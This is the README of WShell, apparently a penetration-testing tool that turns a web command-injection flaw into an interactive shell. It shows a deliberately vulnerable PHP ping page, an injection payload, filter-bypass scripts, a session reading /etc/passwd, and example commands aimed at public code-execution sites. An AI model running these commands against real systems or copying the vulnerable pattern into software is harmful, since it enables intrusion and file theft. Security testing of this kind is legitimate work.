<h1 align="center">
  WShell
</h1>

<p align="center">
  <strong>Turn a web-based command injection into a full-featured, interactive web shell.</strong>
</p>

<p align="center">
    <a href="https://docs.python.org/3/"><img src="https://img.shields.io/badge/python-3-green.svg?style=for-the-badge&logo=python&logoColor=white" alt="Python 3"></a>
    <a href="https://github.com/unlock-security/wshell/blob/main/LICENSE"><img src="https://img.shields.io/github/license/unlock-security/wshell?style=for-the-badge&label=License&color=red" alt="WShell License"></a>
    <a href="https://github.com/unlock-security/wshell/releases/latest"><img src="https://img.shields.io/github/v/release/unlock-security/wshell?include_prereleases&sort=semver&display_name=release&style=for-the-badge" alt="GitHub Release"></a>
    <a href="https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell"><img src="https://img.shields.io/badge/Made_by-🔓_Unlock_Security-blue.svg?style=for-the-badge" alt="Made by Unlock Security"></a>
</p>

---

WShell is a post-exploitation tool designed to exploit any web-based command injection vulnerability into an interactive and feature-rich pseudo-shell. It provides an agentless, language-agnostic shell that feels like a native terminal, complete with command history, change directory support, file transfers and much more.

## ✨ Key Features

- **Interactive Pseudo-Shell**: Experience a shell with support for commands like `cd` and a persistent command history.
- **Automatic OS Detection**: Automatically identifies the target OS (Linux, Windows CMD, Windows PowerShell) and adjusts its behavior accordingly.
- **Extensible Input/Output Scripts**: Manipulate command payloads and server responses on-the-fly with a chain of scripts (e.g., `base64encode`, `urlencode`, `unescape`, `space2ifs`).
- **Built-in Custom Commands**: Powerful custom commands like `download` and `upload` that abstract away OS-specific complexities for file transfers.
- **Flexible HTTP Configuration**: Full control over HTTP requests, including method, headers, cookies, and body (form-data or JSON).
- **Extensible by Design**: Easily add your own custom commands and scripts to tailor WShell to your needs.
- **Agentless**: No need to upload a separate web shell file; WShell leverages the existing vulnerability.

## 🚀 Getting Started

### Installation

Install WShell using your favorite Python package manager. `pipx` or `uv` are recommended as they install the tool in an isolated environment.

**With `pipx`:**

```shell
pipx install git+https://github.com/unlock-security/wshell.git
```

**With `uv`:**

```shell
uv tool install git+https://github.com/unlock-security/wshell.git
```

### Updating

WShell automatically checks for new versions and eventually upgrade itself on startup. This can be disabled by passing the `--no-update` flag. If you want to include pre-releases in the update check, use `--include-prerelease`.

To upgrade manually, use the appropriate command for your package manager.

### Quick Start

Let's say you've found a command injection vulnerability in a `ping.php` page.

**Vulnerable Code (`ping.php`):**

```php
<?php
    // ping.php
    $host = $_POST['host'];
    $count = intval($_GET['count']);
    // Insecurely uses user input to build a shell command.
    $command = "ping -c {$count} {$host} 2>&1";
    echo "<pre>" . shell_exec($command) . "</pre>";
?>
```

To exploit this, you can use `wshell`.

> The placeholder `WSHELL` marks where your commands will be injected.

```shell
attacker@host:/$ wshell --log=info 'https://www.target.com/ping.php?count=3' 'host=;WSHELL #'
[13:37:00] [INFO] HTTP verb not specified. Using 'POST' based on parameters.
[13:37:00] [INFO] Target OS not specified, trying to automatically detect it.
[13:37:00] [INFO] Target OS detected as Linux.

www-data@target:/var/www/html/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## ⚙️ Usage

The basic syntax is:

```
wshell [OPTIONS] URL [REQUEST_ITEMS...]
```

- `URL`: The vulnerable endpoint.
- `REQUEST_ITEMS`: HTTP headers (`Key: value`) and body parameters (`key=value`) for the request. The `WSHELL` placeholder can be placed in one of these items or in the URL.

### Command-Line Arguments

| Category    | Argument                    | Description                                                            | Default                                  |
| ----------- | --------------------------- | ---------------------------------------------------------------------- | ---------------------------------------- |
| **Core**    | `URL`                       | The vulnerable endpoint URL.                                           | (Required)                               |
|             | `REQUEST ITEMS...`          | Headers (`Key: value`) and body data (`key=value`).                    | -                                        |
|             | `--os`                      | Specify the target OS and shell (`linux`, `win-cmd`, `win-psh`).       | Auto-detected (send additional requests) |
|             | `--placeholder`             | The placeholder for command injection.                                 | `WSHELL`                                 |
|             | `--prompt`                  | A custom static prompt for the shell.                                  | (Dynamic prompt based on target OS)      |
| **HTTP**    | `-m, --method`              | HTTP method for requests.                                              | Auto-detected (POST if data, else GET)   |
|             | `-t, --timeout`             | Connection timeout in seconds. Use `--no-timeout` to disable.          | `3.0`                                    |
|             | `-d, --delay`               | Delay in seconds between each request.                                 | `0`                                      |
|             | `--data-raw`                | Raw data string to be sent (form-urlencoded or JSON).                  | -                                        |
|             | `-j, --json` / `-f, --form` | Serialize body data as JSON (`-j`) or form fields (`-f`).              | `--form`                                 |
|             | `--keep-alive`              | Use a persistent HTTP connection (`--no-keep-alive` to disable).       | `True`                                   |
|             | `--follow`                  | Follow 30x redirects (`--no-follow` to disable).                       | `True`                                   |
|             | `-ua, --user-agent`         | Set a custom User-Agent.                                               | `WShell X.Y.Z`                           |
|             | `-r, --random-agent`        | Use a random User-Agent from a built-in list.                          | `False`                                  |
| **Scripts** | `--input-scripts`           | Comma-separated chain of scripts to process commands _before_ sending. | -                                        |
|             | `--output-scripts`          | Comma-separated chain of scripts to process the server response.       | -                                        |
|             | `--list-scripts`            | List all available input and output scripts.                           | -                                        |
| **App**     | `--log`                     | Set logging level (`critical`, `error`, `warning`, `info`, `debug`).   | `warning`                                |
|             | `--update` / `--no-update`  | Enable or disable the automatic update on startup.                     | `True`                                   |
|             | `--include-prerelease`      | Include pre-releases in the update check.                              | `False`                                  |
|             | `-v, --version`             | Show the version number and exit.                                      | -                                        |
|             | `-h, --help`                | Show the help message and exit.                                        | -                                        |

---

## 🔬 Advanced Features

### Input/Output Scripts

Scripts are powerful functions that manipulate the command payload (input scripts) or the server's response (output scripts). This is essential for bypassing filters or decoding responses.

**Example**: If the vulnerable app requires commands to be base64-encoded and blocks commands containing spaces, you can use a chain of input scripts to match the requirements.

```shell
# The command 'ls -la' will be transformed to 'ls${IFS}-la' and base64-encoded before being sent.
wshell --input-scripts=space2ifs,base64encode 'http://example.com/vuln?cmd=WSHELL'
```

To see all available scripts, run:

```shell
wshell --list-scripts
```

### Custom Commands

WShell supports special custom commands to provide high-level functionality. Type `help -v` in a WShell prompt to see them all.

**Example**: Downloading a file from the target, regardless of the OS.

```
victim@vulnerable-server:/var/www/html/$ download -r /etc/passwd -l passwd.txt
[INFO] Downloading 2337 bytes as 3 chunks (1024 bytes each)
Downloading chunk 3/3
[INFO] File '/etc/passwd' downloaded to 'passwd.txt'
```

This abstracts away the complexity of encoding/decoding files, download large files in chunks or any OS-specific commands and techniques.

## 🛠️ Extending WShell

WShell is built to be extensible. You can easily add your own scripts and commands.

### Developing a Script

1.  Create a Python file in `wshell/scripts/input/` or `wshell/scripts/output/`. The filename becomes the script name.
2.  Inside the file, define a function `run(data: str) -> str` with a docstring.

**Example (`wshell/scripts/input/reverse.py`):**

```python
def run(command: str) -> str:
    """Reverses the command string."""
    return command[::-1]
```

You can now use `--input-scripts=reverse` from the command line.

### Developing a Custom Command

1.  Create a Python file in a subdirectory of `wshell/commands/`. The subdirectory defines the command's category in the `help` menu.
2.  Create a class that inherits from `wshell.commands.WShellCommandSet` and follows the `cmd2` [Modular Commands](https://cmd2.readthedocs.io/en/stable/features/modular_commands/) guide.

WShell provides `self._cmd.injector` to execute commands on the target and `self._dispatch()` to create OS-specific functions.

**Example (`wshell/commands/php/phpinfo.py`):**

```python
import argparse
from cmd2 import with_argparser
from wshell.commands import WShellCommandSet

class PHPInfoCommandSet(WShellCommandSet):
    _argparser = argparse.ArgumentParser(description="Create a phpinfo() file.")
    _argparser.add_argument("-f", "--filename", default="info.php", help="Name of the file.")

    @with_argparser(_argparser)
    def do_phpinfo(self, args) -> None:
        """Creates a file that executes `phpinfo()` in the current directory."""
        file_content = "<?php phpinfo();"
        self._dispatch("write_file", args.filename, file_content)
        self._cmd.poutput(f"PHP info file created at '{args.filename}'")

    # Linux implementation
    def _linux_write_file(self, filename, content):
        self._cmd.injector.execute(f"echo -n '{content}' > {filename}")

    # Windows PowerShell implementation
    def _win_psh_write_file(self, filename, content):
        self._cmd.injector.execute(f"Set-Content -Path '{filename}' -Value '{content}'")

    # Windows CMD implementation
    def _win_cmd_write_file(self, filename, content):
        self._cmd.injector.execute(f"echo {content} > {filename}")
```

The command `phpinfo` will now be available under the `Php` category.

## 🌍 Real-World Use Cases

```sh
# Hack an online shell learning platform (cmdchallenge.com)
wshell --input-scripts=base64encode --output-scripts=unescape --delay=1.5 'https://cmdchallenge.com/c/r' 'cmd=WSHELL' 'slug=create_file'

# Exploit a code execution feature on a learning site (learnshell.org)
wshell --output-scripts=unescape --json 'https://www.learnshell.org/' 'code=WSHELL' 'language=bash'

# Target an online compiler API (onecompiler.com)
wshell --json --output-scripts=unescape 'https://onecompiler.com/api/code/exec' 'properties[language]=bash' 'properties[files][][content]=WSHELL'
```

## 👨‍💻 Development

Set up the project for local development:

```sh
git clone https://github.com/unlock-security/wshell
cd wshell/
python3 -m venv .venv
source .venv/bin/activate
pip install -e .
```

## 🙌 Contributing

We welcome contributions! Please look through existing [Issues](https://github.com/unlock-security/wshell/issues) and [Pull Requests](https://github.com/unlock-security/wshell/pulls).
If you have a new idea or a bug to report, please create an issue.

[See the Contribution Guide →](https://github.com/unlock-security/wshell/blob/main/CONTRIBUTING.md)

## 📜 License

This project is licensed under the GPL-3.0 License. See the [LICENSE](https://github.com/unlock-security/wshell/blob/main/LICENSE) file for details.

---

<p align="center">Made with 💙 by <a href="https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell" target="_blank">Unlock Security</a></p>
<p align="center">
    <img src="https://www.unlock-security.it/wp-content/uploads/2026/04/unlock-security-registered-logo-rgb.svg" width="150">
</p>
